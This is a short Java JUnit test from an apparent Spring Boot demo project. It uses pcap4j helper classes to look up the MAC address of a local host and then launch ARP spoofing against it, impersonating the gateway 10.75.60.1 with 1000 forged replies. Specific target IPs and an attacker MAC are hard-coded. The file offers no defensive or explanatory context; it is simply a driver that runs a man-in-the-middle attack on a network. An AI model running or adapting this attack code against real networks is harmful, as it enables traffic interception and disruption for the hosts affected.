package com.rbac.demo;

import com.rbac.demo.pcap4j.ArpReply;
import com.rbac.demo.pcap4j.GetMacByIp;
import org.junit.jupiter.api.Test;
import org.pcap4j.core.NotOpenException;
import org.pcap4j.core.PcapNativeException;
import org.pcap4j.util.MacAddress;
import org.springframework.boot.test.context.SpringBootTest;

import java.net.UnknownHostException;

@SpringBootTest
public class Pcap4JTest3 {
    @Test
    public void Test(){
        GetMacByIp getMacByIp=new GetMacByIp();
        ArpReply arpReply=new ArpReply();
//        String strDstIpAddress,String strSrcIpAddress,String srcMacAddr,String interfaceIp
        try {
            String dstMac=getMacByIp.GetMac("10.75.60.127","10.75.60.35","6c:4b:90:8b:42:03","10.75.60.35",2);
            if(!dstMac.equals("0")){
                arpReply.ARPSpoofing(dstMac,"10.75.60.127","6c:4b:90:8b:42:03","10.75.60.1",1000,"10.75.60.35");

            }else {
                System.out.println("主机不存活");
            }
        } catch (PcapNativeException e) {
            e.printStackTrace();
        } catch (NotOpenException e) {

        } catch (UnknownHostException e) {
            e.printStackTrace();
        }
    }
}
